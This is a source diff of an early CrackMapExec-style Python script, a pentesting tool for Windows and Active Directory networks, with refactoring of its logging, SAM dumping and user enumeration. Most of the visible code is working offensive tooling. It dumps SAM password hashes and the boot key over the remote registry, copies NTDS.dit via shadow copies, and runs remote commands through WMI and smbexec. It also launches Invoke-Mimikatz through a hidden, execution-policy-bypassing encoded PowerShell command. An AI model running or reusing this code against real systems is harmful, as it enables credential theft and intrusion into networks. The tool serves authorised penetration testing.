@@ -26,6 +26,7 @@ from argparse import RawTextHelpFormatter
 from binascii import unhexlify, hexlify
 from Crypto.Cipher import DES, ARC4
 
+import socket
 import hashlib
 import BaseHTTPServer
 import logging
@@ -43,6 +44,10 @@ OUTPUT_FILENAME = ''.join(random.sample(string.ascii_letters, 10))
 BATCH_FILENAME  = ''.join(random.sample(string.ascii_letters, 10)) + '.bat'
 SMBSERVER_DIR   = ''.join(random.sample(string.ascii_letters, 10))
 DUMMY_SHARE     = 'TMP'
+
+logging.basicConfig(format="%(asctime)s %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
+log = logging.getLogger()
+log.setLevel(logging.INFO)
 
 # Structures
 # Taken from http://insecurety.net/?p=768
@@ -307,7 +312,7 @@ class SAMHashes(OfflineRegistry):
         return md5.digest()
 
     def getHBootKey(self):
-        logging.debug('Calculating HashedBootKey from SAM')
+        #log.debug('Calculating HashedBootKey from SAM')
         QWERTY = "!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%\0"
         DIGITS = "0123456789012345678901234567890123456789\0"
 
@@ -350,7 +355,9 @@ class SAMHashes(OfflineRegistry):
             # No SAM file provided
             return
 
-        logging.info('Dumping local SAM hashes (uid:rid:lmhash:nthash)')
+        sam_hashes = []
+
+        #log.info('Dumping local SAM hashes (uid:rid:lmhash:nthash)')
         self.getHBootKey()
 
         usersKey = 'SAM\\Domains\\Account\\Users'
@@ -391,7 +398,9 @@ class SAMHashes(OfflineRegistry):
 
             answer =  "%s:%d:%s:%s:::" % (userName, rid, hexlify(lmHash), hexlify(ntHash))
             self.__itemsFound[rid] = answer
-            print answer
+            sam_hashes.append(answer)
+
+        return sam_hashes
 
     def export(self, fileName):
         if len(self.__itemsFound) > 0:
@@ -567,7 +576,7 @@ class RemoteOperations:
         if resp['pmsgOut']['V2']['cItems'] > 0:
             self.__NtdsDsaObjectGuid = resp['pmsgOut']['V2']['rItems'][0]['NtdsDsaObjectGuid']
         else:
-            logging.error("Couldn't get DC info for domain %s" % self.__domainName)
+            log.error("Couldn't get DC info for domain %s" % self.__domainName)
             raise Exception('Fatal, aborting')
 
     def getDrsr(self):
@@ -680,7 +689,7 @@ class RemoteOperations:
                 account = account[2:]
             return account
         except Exception, e:
-            logging.error(e)
+            log.error(e)
             return None
 
     def __checkServiceStatus(self):
@@ -693,11 +702,11 @@ class RemoteOperations:
         # Let's check its status
         ans = scmr.hRQueryServiceStatus(self.__scmr, self.__serviceHandle)
         if ans['lpServiceStatus']['dwCurrentState'] == scmr.SERVICE_STOPPED:
-            logging.info('Service %s is in stopped state'% self.__serviceName)
+            log.info('Service %s is in stopped state'% self.__serviceName)
             self.__shouldStop = True
             self.__started = False
         elif ans['lpServiceStatus']['dwCurrentState'] == scmr.SERVICE_RUNNING:
-            logging.debug('Service %s is already running'% self.__serviceName)
+            log.debug('Service %s is already running'% self.__serviceName)
             self.__shouldStop = False
             self.__started  = True
         else:
@@ -707,10 +716,10 @@ class RemoteOperations:
         if self.__started is False:
             ans = scmr.hRQueryServiceConfigW(self.__scmr,self.__serviceHandle)
             if ans['lpServiceConfig']['dwStartType'] == 0x4:
-                logging.info('Service %s is disabled, enabling it'% self.__serviceName)
+                log.info('Service %s is disabled, enabling it'% self.__serviceName)
                 self.__disabled = True
                 scmr.hRChangeServiceConfigW(self.__scmr, self.__serviceHandle, dwStartType = 0x3)
-            logging.info('Starting service %s' % self.__serviceName)
+            log.info('Starting service %s' % self.__serviceName)
             scmr.hRStartServiceW(self.__scmr,self.__serviceHandle)
             sleep(1)
 
@@ -722,10 +731,10 @@ class RemoteOperations:
     def __restore(self):
         # First of all stop the service if it was originally stopped
         if self.__shouldStop is True:
-            logging.info('Stopping service %s' % self.__serviceName)
+            log.info('Stopping service %s' % self.__serviceName)
             scmr.hRControlService(self.__scmr, self.__serviceHandle, scmr.SERVICE_CONTROL_STOP)
         if self.__disabled is True:
-            logging.info('Restoring the disabled state for service %s' % self.__serviceName)
+            log.info('Restoring the disabled state for service %s' % self.__serviceName)
             scmr.hRChangeServiceConfigW(self.__scmr, self.__serviceHandle, dwStartType = 0x4)
         if self.__serviceDeleted is False:
             # Check again the service we created does not exist, starting a new connection
@@ -774,7 +783,7 @@ class RemoteOperations:
         ans = rrp.hOpenLocalMachine(self.__rrp)
         self.__regHandle = ans['phKey']
         for key in ['JD','Skew1','GBG','Data']:
-            logging.debug('Retrieving class info for %s'% key)
+            log.debug('Retrieving class info for %s'% key)
             ans = rrp.hBaseRegOpenKey(self.__rrp, self.__regHandle, 'SYSTEM\\CurrentControlSet\\Control\\Lsa\\%s' % key)
             keyHandle = ans['phkResult']
             ans = rrp.hBaseRegQueryInfoKey(self.__rrp,keyHandle)
@@ -788,12 +797,12 @@ class RemoteOperations:
         for i in xrange(len(bootKey)):
             self.__bootKey += bootKey[transforms[i]]
 
-        logging.info('Target system bootKey: 0x%s' % hexlify(self.__bootKey))
+        log.info('Target system bootKey: 0x%s' % hexlify(self.__bootKey))
 
         return self.__bootKey
 
     def checkNoLMHashPolicy(self):
-        logging.debug('Checking NoLMHash Policy')
+        log.debug('Checking NoLMHash Policy')
         ans = rrp.hOpenLocalMachine(self.__rrp)
         self.__regHandle = ans['phKey']
 
@@ -805,10 +814,10 @@ class RemoteOperations:
             noLMHash = 0
 
         if noLMHash != 1:
-            logging.debug('LMHashes are being stored')
+            log.debug('LMHashes are being stored')
             return False
 
-        logging.debug('LMHashes are NOT being stored')
+        log.debug('LMHashes are NOT being stored')
         return True
 
     def __retrieveHive(self, hiveName):
@@ -828,11 +837,11 @@ class RemoteOperations:
         return remoteFileName
 
     def saveSAM(self):
-        logging.debug('Saving remote SAM database')
+        log.debug('Saving remote SAM database')
         return self.__retrieveHive('SAM')
 
     def saveSECURITY(self):
-        logging.debug('Saving remote SECURITY database')
+        log.debug('Saving remote SECURITY database')
         return self.__retrieveHive('SECURITY')
 
     def __executeRemote(self, data):
@@ -893,7 +902,7 @@ class RemoteOperations:
         return lastShadow, lastShadowFor
 
     def saveNTDS(self):
-        logging.info('Searching for NTDS.dit')
+        log.info('Searching for NTDS.dit')
         # First of all, let's try to read the target NTDS.dit registry entry
         ans = rrp.hOpenLocalMachine(self.__rrp)
         regHandle = ans['phKey']
@@ -915,7 +924,7 @@ class RemoteOperations:
         rrp.hBaseRegCloseKey(self.__rrp, keyHandle)
         rrp.hBaseRegCloseKey(self.__rrp, regHandle)
 
-        logging.info('Registry says NTDS.dit is at %s. Calling vssadmin to get a copy. This might take some time' % ntdsLocation)
+        log.info('Registry says NTDS.dit is at %s. Calling vssadmin to get a copy. This might take some time' % ntdsLocation)
         # Get the list of remote shadows
         shadow, shadowFor = self.__getLastVSS()
         if shadow == '' or (shadow != '' and shadowFor != ntdsDrive):
@@ -950,16 +959,11 @@ class DumpSecrets:
         self.__domain = domain
         self.__lmhash = ''
         self.__nthash = ''
-        self.__smbConnection = None
         self.__remoteOps = None
         self.__SAMHashes = None
         self.__isRemote = True
         if hashes:
             self.__lmhash, self.__nthash = hashes.split(':')
-
-    def connect(self):
-        self.__smbConnection = SMBConnection(self.__remoteAddr, self.__remoteAddr)
-        self.__smbConnection.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)
 
     def getBootKey(self):
         # Local Version whenever we are given the files directly
@@ -970,7 +974,7 @@ class DumpSecrets:
         currentControlSet = winreg.getValue('\\Select\\Current')[1]
         currentControlSet = "ControlSet%03d" % currentControlSet
         for key in ['JD','Skew1','GBG','Data']:
-            logging.debug('Retrieving class info for %s'% key)
+            log.debug('Retrieving class info for %s'% key)
             ans = winreg.getClass('\\%s\\Control\\Lsa\\%s' % (currentControlSet,key))
             digit = ans[:16].decode('utf-16le')
             tmpKey = tmpKey + digit
@@ -982,12 +986,12 @@ class DumpSecrets:
         for i in xrange(len(tmpKey)):
             bootKey += tmpKey[transforms[i]]
 
-        logging.info('Target system bootKey: 0x%s' % hexlify(bootKey))
+        log.info('Target system bootKey: 0x%s' % hexlify(bootKey))
 
         return bootKey
 
     def checkNoLMHashPolicy(self):
-        logging.debug('Checking NoLMHash Policy')
+        log.debug('Checking NoLMHash Policy')
         winreg = winregistry.Registry(self.__systemHive, self.__isRemote)
         # We gotta find out the Current Control Set
         currentControlSet = winreg.getValue('\\Select\\Current')[1]
@@ -1001,15 +1005,14 @@ class DumpSecrets:
             noLmHash = 0
 
         if noLmHash != 1:
-            logging.debug('LMHashes are being stored')
+            log.debug('LMHashes are being stored')
             return False
-        logging.debug('LMHashes are NOT being stored')
+        log.debug('LMHashes are NOT being stored')
         return True
 
-    def dump(self):
+    def dump(self, smbConnection):
         try:
-            self.connect()
-            self.__remoteOps = RemoteOperations(self.__smbConnection)
+            self.__remoteOps = RemoteOperations(smbConnection)
             self.__remoteOps.enableRegistry()
             bootKey = self.__remoteOps.getBootKey()
 
@@ -1019,19 +1022,21 @@ class DumpSecrets:
             SAMFileName = self.__remoteOps.saveSAM()
 
             self.__SAMHashes = SAMHashes(SAMFileName, bootKey)
-            self.__SAMHashes.dump()
+            sam_hashes = self.__SAMHashes.dump()
 
             SECURITYFileName = self.__remoteOps.saveSECURITY()
 
+            return sam_hashes
+
         except (Exception, KeyboardInterrupt), e:
-            logging.error(e)
+            log.error(e)
             try:
                 self.cleanup()
             except:
                 pass
 
     def cleanup(self):
-        logging.info('Cleaning up... ')
+        log.info('Cleaning up... ')
         if self.__remoteOps:
             self.__remoteOps.finish()
         if self.__SAMHashes:
@@ -1068,51 +1073,28 @@ class SAMRDump:
         """Dumps the list of users and shares registered present at
         addr. Addr is a valid host name or IP address.
         """
-
-        logging.info('Retrieving endpoint list from %s' % addr)
+        #log.info('Retrieving endpoint list from %s' % addr)
 
         # Try all requested protocols until one works.
-        entries = []
         for protocol in self.__protocols:
             protodef = SAMRDump.KNOWN_PROTOCOLS[protocol]
             port = protodef[1]
 
-            logging.info("Trying protocol %s..." % protocol)
+            #log.info("Trying protocol %s..." % protocol)
             rpctransport = transport.SMBTransport(addr, port, r'\samr', self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash, self.__aesKey, doKerberos = self.__doKerberos)
 
             try:
-                entries = self.__fetchList(rpctransport)
+                return self.__fetchList(rpctransport)
             except Exception, e:
                 logging.critical(str(e))
             else:
                 # Got a response. No need for further iterations.
                 break
 
-        # Display results.
-
-        for entry in entries:
-            (username, uid, user) = entry
-            base = "%s (%d)" % (username, uid)
-            print base + '/FullName:', user['FullName']
-            print base + '/UserComment:', user['UserComment']
-            print base + '/PrimaryGroupId:', user['PrimaryGroupId']
-            print base + '/BadPasswordCount:', user['BadPasswordCount']
-            print base + '/LogonCount:', user['LogonCount']
-
-        if entries:
-            num = len(entries)
-            if 1 == num:
-                logging.info('Received one entry.')
-            else:
-                logging.info('Received %d entries.' % num)
-        else:
-            logging.info('No entries received.')
-
-
     def __fetchList(self, rpctransport):
         dce = rpctransport.get_dce_rpc()
 
-        entries = []
+        entries = {'users': []}
 
         dce.connect()
         dce.bind(samr.MSRPC_UUID_SAMR)
@@ -1124,16 +1106,21 @@ class SAMRDump:
             resp = samr.hSamrEnumerateDomainsInSamServer(dce, serverHandle)
             domains = resp['Buffer']['Buffer']
 
-            print 'Found domain(s):'
-            for domain in domains:
-                print " . %s" % domain['Name']
-
-            logging.info("Looking up users in domain %s" % domains[0]['Name'])
+            #log.info("Looking up users in domain %s" % domains[0]['Name'])
 
             resp = samr.hSamrLookupDomainInSamServer(dce, serverHandle,domains[0]['Name'] )
 
             resp = samr.hSamrOpenDomain(dce, serverHandle = serverHandle, domainId = resp['DomainId'])
             domainHandle = resp['DomainHandle']
+
+            resp = samr.hSamrQueryInformationDomain(dce, domainHandle)
+            lthresh =  resp['Buffer']['General2']['LockoutThreshold']
+            entries["lthresh"] = lthresh
+
+            if lthresh != 0:
+                entries['lduration'] = (resp['Buffer']['General2']['LockoutDuration'] / -600000000)
+            else:
+                entries['lduration'] = 0
 
             status = STATUS_MORE_ENTRIES
             enumerationContext = 0
@@ -1146,12 +1133,11 @@ class SAMRDump:
                     resp = e.get_packet()
 
                 for user in resp['Buffer']['Buffer']:
-                    r = samr.hSamrOpenUser(dce, domainHandle, samr.USER_READ_GENERAL | samr.USER_READ_PREFERENCES | samr.USER_READ_ACCOUNT, user['RelativeId'])
-                    print "Found user: %s, uid = %d" % (user['Name'], user['RelativeId'] )
-    
+                    r = samr.hSamrOpenUser(dce, domainHandle, samr.MAXIMUM_ALLOWED, user['RelativeId'])
+
                     info = samr.hSamrQueryInformationUser2(dce, r['UserHandle'],samr.USER_INFORMATION_CLASS.UserAllInformation)
-                    entry = (user['Name'], user['RelativeId'], info['Buffer']['All'])
-                    entries.append(entry)
+                    #entry = (user['Name'], user['RelativeId'], info['Buffer']['All'])
+                    entries['users'].append(user['Name'])
                     samr.hSamrCloseHandle(dce, r['UserHandle'])
 
                 enumerationContext = resp['EnumerationContext'] 
@@ -1307,8 +1293,8 @@ class CMDEXEC:
             protodef = CMDEXEC.KNOWN_PROTOCOLS[protocol]
             port = protodef[1]
 
-            #logging.info("Trying protocol %s..." % protocol)
-            #logging.info("Creating service %s..." % self.__serviceName)
+            #log.info("Trying protocol %s..." % protocol)
+            #log.info("Creating service %s..." % self.__serviceName)
 
             stringbinding = protodef[0] % addr
 
@@ -1479,7 +1465,6 @@ def ps_command(command):
 def connect(host):
     try:
         smb = SMBConnection(host, host, None, args.port)
-
         try:
             smb.login('' , '')
         except SessionError as e:
@@ -1490,63 +1475,83 @@ def connect(host):
         if not domain:
             domain = smb.getServerName()
 
+        try:
+            smb.logoff()
+        except:
+            pass
+
+    except socket.error as e:
+        return
+    except Exception as e:
+        traceback.print_exc()
+
+    try:
+        lmhash = ''
+        nthash = ''
+        if args.hash:
+            lmhash, nthash = args.hash.split(':')
+
+        smb = SMBConnection(host, host, None, args.port)
+        smb.login(args.user, args.passwd, domain, lmhash, nthash)
+
         if args.mimikatz:
             args.command = 'powershell.exe -exec bypass -window hidden -noni -nop -encoded {}'.format(mimikatz_command(args.local_ip))
 
         if args.pscommand:
             args.command = 'powershell.exe -exec bypass -window hidden -noni -nop -encoded {}'.format(ps_command(args.pscommand))
 
+        if args.sam:
+            dsecrets = DumpSecrets(host, args.user, args.passwd, args.domain, args.hash)
+            sam_dump = dsecrets.dump(smb)
+
+        if args.enum_users:
+            user_dump = SAMRDump("{}/SMB".format(args.port), args.user, args.passwd, args.domain, args.hash).dump(host)
+
+        if args.command:
+
+            if args.execm == 'wmi':
+                executer = WMIEXEC(args.command, args.user, args.passwd, args.domain, args.hash, args.share)
+                result = executer.run(host, smb)
+
+            elif args.execm == 'smbexec':
+                executer = CMDEXEC('{}/SMB'.format(args.port), args.user, args.passwd, args.domain, args.hash, args.share, args.command)
+                result = executer.run(host)
+
+        if args.list_shares:
+            share_list = _listShares(smb)
+
         tlock.acquire()
         with tlock:
-
             print "[+] {}:{} is running {} (name:{}) (domain:{})".format(host, args.port, smb.getServerOS(), smb.getServerName(), domain)
-
-            if args.sam:
-                dumper = DumpSecrets(host, args.user, args.passwd, args.domain, args.hash)
-                dumper.dump()
+            if args.list_shares:
+                print '\tSHARE\t\t\tPermissions'
+                print '\t-----\t\t\t-----------'
+                for share, perm in share_list.iteritems():
+                    print "\t{}\t\t\t{}".format(share, perm)
 
             if args.enum_users:
-                user_dump = SAMRDump("{}/SMB".format(args.port), args.user, args.passwd, args.domain, args.hash)
-                user_dump.dump(host)
+                print "[+] {}:{} {} {} ( LockoutTries={} LockoutTime={} )".format(host, args.port, domain, user_dump['users'], user_dump['lthresh'], user_dump['lduration'])
 
-            if args.list_shares or args.command:
-                try:
+            if args.sam:
+                for sam_hash in sam_dump:
+                    print sam_hash
 
-                    lmhash = ''
-                    nthash = ''
-                    if args.hash:
-                        lmhash, nthash = args.hash.split(':')
+        tlock.release()
 
-                    smb.login(args.user, args.passwd, args.domain, lmhash, nthash)
+        try:
+            smb.logoff()
+        except:
+            pass
 
-                    if args.list_shares:
-                        print '\tSHARE{}\tPermissions'.format(' '.ljust(50))
-                        print '\t-----{}\t-----------'.format(' '.ljust(50))
-                        for share, perm in _listShares(smb).iteritems():
-                            print "\t{}{}\t{}".format(share,' '.ljust(50), perm)
+    except SessionError as e:
+        print "[+] {}:{} is running {} (name:{}) (domain:{})".format(host, args.port, smb.getServerOS(), smb.getServerName(), domain)
+        print "[-] {}:{} {}".format(host, args.port, e)
 
-                    if args.command:
-
-                        if args.execm == 'wmi':
-                            executer = WMIEXEC(args.command, args.user, args.passwd, args.domain, args.hash, args.share)
-                            result = executer.run(host, smb)
-
-                        elif args.execm == 'smbexec':
-                            executer = CMDEXEC('{}/SMB'.format(args.port), args.user, args.passwd, args.domain, args.hash, args.share, args.command)
-                            result = executer.run(host)
-
-                        if result: print result
-
-                    smb.logoff()
-
-                except SessionError as e:
-                    print "[-] {}:{} {}".format(host, args.port, e)
+    except socket.error as e:
+        return
 
     except Exception as e:
-        if ("Connection refused" or "Network unreachable" or "No route to host") in e.message:
-            return
-    else:
-        tlock.release()
+        traceback.print_exc()
 
 def concurrency(hosts):
     ''' Open all the greenlet threads '''
@@ -1556,14 +1561,16 @@ def concurrency(hosts):
         joinall(jobs)
     except KeyboardInterrupt:
         print "[!] Got CTRL-C! Exiting.."
-        sys.exit(1)
+        sys.exit(0)
 
 if __name__ == '__main__':
 
     if os.geteuid() is not 0:
         sys.exit("[-] Run me as r00t!")
 
-    parser = argparse.ArgumentParser(description=""" CracKMapExec - Swiss army knife for pentesting Windows/AD environments | @byt3bl33d3r\n
+    parser = argparse.ArgumentParser(description=""" CrackMapExec - Swiss army knife for pentesting Windows/Active Directory environments | @byt3bl33d3r\n
+ Powered by Impacket https://github.com/CoreSecurity/impacket
+
  Inspired by: @ShawnDEvans's smbmap https://github.com/ShawnDEvans/smbmap
               @gojhonny's CredCrack https://github.com/gojhonny/CredCrack
               @pentestgeek's smbexec https://github.com/pentestgeek/smbexec""",
@@ -1576,17 +1583,21 @@ if __name__ == '__main__':
     parser.add_argument("-s", metavar="SHARE", dest='share', default="C$", help="Specify a share (default C$)")
     parser.add_argument("-P", dest='port', type=int, choices={139, 445}, default=445, help="SMB port (default 445)")
     parser.add_argument("-t", default=10, type=int, dest="threads", help="Set how many concurrent threads to use")
-    parser.add_argument("-S", action="store_true", dest="list_shares", help="List shares")
-    parser.add_argument("-U", action='store_true', dest='enum_users', help='Enumerate users')
     parser.add_argument("-l", type=str, dest='local_ip', help='Local IP address')
-    parser.add_argument("-sam", action='store_true', dest='sam', help='Dump SAM hashes from target systems')
-    parser.add_argument("-M", action='store_true', dest='mimikatz', help='Run Invoke-Mimikatz on target systems')
     parser.add_argument("target", nargs=1, type=str, help="The target range or CIDR identifier")
 
-    sgroup = parser.add_argument_group("Command Execution", "Options for executing commands on the specified host")
-    sgroup.add_argument('-execm', choices={"wmi", "smbexec"}, dest="execm", default="wmi", help="Method to execute the command (default: wmi)")
-    sgroup.add_argument("-x", metavar="COMMAND", dest='command', help="Execute the specified command")
-    sgroup.add_argument("-X", metavar="PSCOMMAND", dest='pscommand', help='Excute the specified powershell command')
+    rgroup = parser.add_argument_group("Credential Gathering", "Options for gathering credentials from specified systems")
+    rgroup.add_argument("-sam", action='store_true', dest='sam', help='Dump SAM hashes from target systems')
+    rgroup.add_argument("-M", action='store_true', dest='mimikatz', help='Run Invoke-Mimikatz on target systems')
+
+    egroup = parser.add_argument_group("Mapping/Enumeration", "Options for Mapping/Enumerating the specified systems")
+    egroup.add_argument("-S", action="store_true", dest="list_shares", help="List shares")
+    egroup.add_argument("-U", action='store_true', dest='enum_users', help='Enumerate users')
+
+    cgroup = parser.add_argument_group("Command Execution", "Options for executing commands on the specified systems")
+    cgroup.add_argument('-execm', choices={"wmi", "smbexec"}, dest="execm", default="wmi", help="Method to execute the command (default: wmi)")
+    cgroup.add_argument("-x", metavar="COMMAND", dest='command', help="Execute the specified command")
+    cgroup.add_argument("-X", metavar="PSCOMMAND", dest='pscommand', help='Excute the specified powershell command')
 
     args = parser.parse_args()
 
